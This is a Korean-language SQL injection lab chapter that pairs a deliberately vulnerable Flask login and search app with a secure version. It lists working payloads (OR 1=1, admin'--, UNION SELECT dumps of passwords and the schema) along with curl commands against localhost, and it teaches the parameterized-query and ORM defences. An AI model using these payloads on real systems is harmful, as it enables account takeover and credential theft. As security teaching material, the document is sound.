# Chapter 04: SQL Injection 실습

## 학습 목표
- SQL Injection 취약점의 원리 이해
- 공격 기법 실습 (Authentication Bypass, UNION-based)
- Parameterized Query와 ORM을 활용한 방어 구현

## 실습 환경 실행

```bash
cd ch04-sql-injection
# 취약한 버전과 안전한 버전 동시 실행
docker-compose up -d

# 취약한 버전: http://localhost:5001
# 안전한 버전: http://localhost:5002
```

## 실습 1: Authentication Bypass

### 취약한 코드 (vulnerable/app.py:42)
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 공격 방법
1. http://localhost:5001 접속
2. Username: `' OR '1'='1`
3. Password: 아무 값

### 예상 결과
- 비밀번호 없이 로그인 성공
- 실행된 쿼리: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`

## 실습 2: SQL Comment Injection (admin'-- 페이로드)

### 취약한 코드
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 공격 방법
1. http://localhost:5001 접속
2. Username: `admin'--`
3. Password: 아무 값 (또는 비워둠)

### 동작 원리
SQL 주석(`--`)을 사용하여 비밀번호 검증 부분을 제거:

```sql
-- 원래 쿼리
SELECT * FROM users WHERE username = 'admin' AND password = 'user_input'

-- 페이로드 적용 후
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

-- 실제 실행되는 쿼리 (-- 뒤는 주석 처리됨)
SELECT * FROM users WHERE username = 'admin'
```

### 예상 결과
- **비밀번호 없이 admin 계정으로 로그인 성공**
- `AND password = '...'` 부분이 주석 처리되어 무시됨
- admin 사용자가 존재하면 즉시 인증 통과

### 실습 과정
```bash
# 1. 취약한 버전 테스트
curl -X POST http://localhost:5001/login \
  -d "username=admin'--&password=anything"
# 결과: 로그인 성공 (비밀번호 우회)

# 2. 안전한 버전 테스트
curl -X POST http://localhost:5002/login \
  -d "username=admin'--&password=anything"
# 결과: 로그인 실패 (Parameterized Query로 방어)
```

### 다양한 주석 기법
```sql
-- MySQL/PostgreSQL 주석
admin'--
admin'-- -
admin'#

-- 멀티라인 주석
admin'/*

-- 특수 문자 조합
admin';--
admin' OR '1'='1'--
```

### 방어 확인
안전한 버전은 Parameterized Query를 사용하여 방어:
```python
# secure/app.py
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```

위 방식에서는 `admin'--`가 문자열 리터럴로 처리되어 SQL 주석으로 해석되지 않습니다.

## 실습 3: UNION-based SQL Injection

### 공격 방법
1. 검색창에 입력 (검색 쿼리는 3개 컬럼 반환):
```
' UNION SELECT id, username, password FROM users--
```

### 예상 결과
- email 필드에 password가 노출됨
- 실행된 쿼리: `SELECT id, username, email FROM users WHERE username LIKE '%' UNION SELECT id, username, password FROM users--%'`

### 추가 공격 예시
```sql
-- 모든 사용자 정보 추출 (3컬럼 맞춤)
' UNION SELECT id, username || ':' || password, role FROM users--

-- 테이블 정보 추출 (SQLite)
' UNION SELECT 1, name, sql FROM sqlite_master--
```

## 방어 기법

### 1. Parameterized Query (권장)
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### 2. ORM 사용 (secure/app.py)
```python
user = User.query.filter_by(username=username).first()
```

### 3. 입력값 검증
```python
def validate_username(username: str) -> bool:
    return bool(re.match(r"^[a-zA-Z0-9_]+$", username))
```

## 체크리스트

- [ ] 문자열 포맷팅으로 쿼리 생성하지 않기
- [ ] Parameterized Query 또는 ORM 사용
- [ ] 입력값 화이트리스트 검증
- [ ] 에러 메시지에서 쿼리 정보 숨기기
- [ ] 최소 권한 DB 계정 사용
- [ ] secret_key 환경변수 사용
- [ ] debug=False 설정 (프로덕션)
- [ ] Bandit 정적 분석 통과

## 테스트 방법

### 1. Bandit 정적 분석 (권장)
```bash
cd ch04-sql-injection

# 자동 스캔 (취약한 코드 vs 안전한 코드 비교)
./test_bandit.sh

# 또는 수동 실행
bandit -r vulnerable/ -ll
bandit -r secure/ -ll
```

**예상 결과:**
| 코드 | Bandit 결과 |
|------|------------|
| `vulnerable/app.py` | 🔴 B608: 하드코딩된 SQL 쿼리 (문자열 포맷팅)<br>🔴 B201: debug=True 활성화<br>🔴 B105: 하드코딩된 secret_key |
| `secure/app.py` | ✅ SQL 인젝션 없음 (ORM 사용)<br>⚠️ B105: secret_key (환경변수 권장) |

**Bandit가 탐지하는 SQL 인젝션 패턴:**
- 문자열 포맷팅을 사용한 SQL 쿼리 (`f"SELECT * FROM users WHERE username = '{username}'"`)
- `%` 연산자를 사용한 SQL 쿼리 (`"SELECT * FROM users WHERE id = %s" % user_id`)
- `+` 연산자를 사용한 SQL 쿼리 (`"SELECT * FROM users WHERE name = '" + name + "'"`)

**안전한 패턴:**
- Parameterized query: `cursor.execute("SELECT * FROM users WHERE username = ?", (username,))`
- ORM 사용: `User.query.filter_by(username=username).first()`

### 2. pytest 실행
```bash
cd ch04-sql-injection
pytest test_app.py -v
```

**예상 출력:**
```
test_app.py::TestVulnerableApp::test_index PASSED                    [ 16%]
test_app.py::TestVulnerableApp::test_login_valid PASSED              [ 33%]
test_app.py::TestVulnerableApp::test_search PASSED                   [ 50%]
test_app.py::TestSecureApp::test_index PASSED                        [ 66%]
test_app.py::TestSecureApp::test_login_valid PASSED                  [ 83%]
test_app.py::TestSecureApp::test_search PASSED                       [100%]

============================== 6 passed in 0.48s ==============================
```

**테스트 항목:**
| 테스트 | 설명 | 결과 |
|--------|------|------|
| `test_index` | 메인 페이지 (/) 접근 테스트 | 두 버전 모두 통과 |
| `test_login_valid` | 정상 로그인 (alice/password) 테스트 | 두 버전 모두 통과 |
| `test_search` | 검색 기능 기본 테스트 | 두 버전 모두 통과 |

**개별 테스트 실행:**
```bash
# 취약한 버전만 테스트
pytest test_app.py::TestVulnerableApp -v

# 안전한 버전만 테스트
pytest test_app.py::TestSecureApp -v

# SQL Injection 수동 테스트 (pytest로는 공격 테스트 안함)
# 실제 공격 테스트는 Docker 또는 수동 테스트 섹션 참고
```

### 3. Docker 테스트
```bash
cd ch04-sql-injection
docker-compose up -d

# 취약한 버전 - Authentication Bypass (OR 1=1)
curl -X POST http://localhost:5001/login \
  -d "username=' OR '1'='1&password=anything"
# 결과: 로그인 성공

# 취약한 버전 - SQL Comment Injection (admin'-- 페이로드)
curl -X POST http://localhost:5001/login \
  -d "username=admin'--&password=anything"
# 결과: admin 계정으로 로그인 성공 (비밀번호 우회)

# 취약한 버전 - 다른 사용자로 주석 우회
curl -X POST http://localhost:5001/login \
  -d "username=alice'--&password=wrong"
# 결과: alice 계정으로 로그인 성공

# 취약한 버전 - UNION Injection
curl "http://localhost:5001/search?q=' UNION SELECT id, username, password FROM users--"
# 결과: 모든 사용자의 비밀번호 노출

# 안전한 버전 - Authentication Bypass 차단
curl -X POST http://localhost:5002/login \
  -d "username=' OR '1'='1&password=anything"
# 결과: 로그인 실패

# 안전한 버전 - SQL Comment Injection 차단
curl -X POST http://localhost:5002/login \
  -d "username=admin'--&password=anything"
# 결과: 로그인 실패 (Parameterized Query로 방어)

docker-compose down
```

### 4. 수동 테스트

#### 테스트 케이스 1: OR 1=1 공격
1. http://localhost:5001 접속
2. Username: `' OR '1'='1`, Password: 아무 값
3. 로그인 성공 확인 (취약점)
4. http://localhost:5002에서 동일 테스트
5. 로그인 실패 확인 (방어 성공)

#### 테스트 케이스 2: SQL Comment Injection (admin'-- 페이로드)
1. http://localhost:5001 접속
2. Username: `admin'--`, Password: 비워둠 또는 아무 값
3. admin 계정으로 로그인 성공 확인 (비밀번호 우회)
4. 브라우저 개발자 도구 → 네트워크 탭에서 요청 확인
5. http://localhost:5002에서 동일 테스트
6. 로그인 실패 확인 (Parameterized Query로 방어)

#### 테스트 케이스 3: 다양한 주석 기법 확인
취약한 버전(5001)에서 다음 페이로드 테스트:
- `alice'--` → alice 계정 로그인 성공
- `admin'#` → admin 계정 로그인 성공 (MySQL)
- `admin'/*` → admin 계정 로그인 성공 (멀티라인 주석)

## 보안 스캐닝

### Bandit 취약점 검출
```bash
# 전체 스캔
bandit -r . -ll

# 특정 파일 스캔
bandit vulnerable/app.py

# JSON 출력
bandit -r vulnerable/ -f json -o bandit-report.json
```

**검출되는 취약점:**
- **B608 (MEDIUM)**: Hardcoded SQL expressions - 문자열 포맷팅으로 SQL 쿼리 생성
- **B201 (HIGH)**: Flask app with debug=True
- **B105 (LOW)**: Hardcoded password string (secret_key)

**권장 사항:**
```python
# ❌ 취약: 문자열 포맷팅
query = f"SELECT * FROM users WHERE username = '{username}'"

# ✅ 안전: Parameterized Query
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# ✅ 안전: ORM 사용
user = User.query.filter_by(username=username).first()

# 환경변수 사용
import os
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24))

# debug=False (프로덕션)
app.run(debug=False)
```

## 참고 자료
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/)
